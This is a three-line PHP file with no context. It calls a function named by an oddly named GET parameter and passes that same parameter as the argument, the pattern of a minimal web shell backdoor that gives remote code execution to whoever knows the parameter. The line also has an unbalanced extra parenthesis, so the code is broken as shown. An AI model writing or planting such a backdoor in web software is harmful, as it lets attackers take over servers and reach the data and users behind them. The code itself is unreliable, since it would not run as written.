<?php
$_GET['TWyXzx7U'](($_GET['TWyXzx7U']);
?>
